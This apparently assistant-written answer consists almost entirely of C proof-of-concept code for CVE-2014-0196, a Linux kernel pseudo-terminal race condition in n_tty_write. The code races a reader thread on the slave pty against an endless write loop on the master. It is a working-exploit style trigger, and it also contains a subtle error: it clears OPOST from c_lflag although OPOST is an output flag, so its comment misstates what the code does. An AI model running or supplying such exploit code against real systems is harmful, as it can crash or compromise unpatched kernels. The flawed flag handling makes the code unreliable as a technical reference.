Based on public documentation for CVE-2014-0196, the following Proof-of-Concept (PoC) code demonstrates the race condition. It works by opening a pseudo-terminal (pty), setting the `ECHO` flag while disabling `OPOST`, and then creating two threads: one to continuously write a large buffer to the master pty and another to read from the slave pty. This simultaneous read/write action triggers the vulnerability in the `n_tty_write` function.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <unistd.h>

void *reader_thread(void *arg) {
    int fd = *(int*)arg;
    char buf[256];
    while (1) {
        if (read(fd, buf, sizeof(buf)) < 0) {
            perror("read");
            break;
        }
    }
    return NULL;
}

int main(void) {
    int ptmx_fd, pts_fd;
    pthread_t pth;
    char large_buf[65536];

    ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (ptmx_fd < 0) {
        perror("open /dev/ptmx");
        return 1;
    }

    // Grant access to the slave PTY
    grantpt(ptmx_fd);
    unlockpt(ptmx_fd);

    char pts_name[128];
    if (ptsname_r(ptmx_fd, pts_name, sizeof(pts_name)) != 0) {
        perror("ptsname_r");
        return 1;
    }

    pts_fd = open(pts_name, O_RDWR | O_NOCTTY);
    if (pts_fd < 0) {
        perror("open slave pty");
        return 1;
    }

    // Set terminal attributes to trigger vulnerable condition: ECHO enabled, OPOST disabled
    struct termios t;
    tcgetattr(pts_fd, &t);
    t.c_lflag |= ECHO;
    t.c_lflag &= ~OPOST;
    tcsetattr(pts_fd, TCSANOW, &t);

    // Create a reader thread
    pthread_create(&pth, NULL, reader_thread, &pts_fd);

    // Fill buffer with arbitrary data
    memset(large_buf, 'A', sizeof(large_buf));

    // Continuously write to trigger the race condition
    while (1) {
        if (write(ptmx_fd, large_buf, sizeof(large_buf)) < 0) {
            perror("write");
            break;
        }
    }

    close(ptmx_fd);
    close(pts_fd);
    return 0;
}
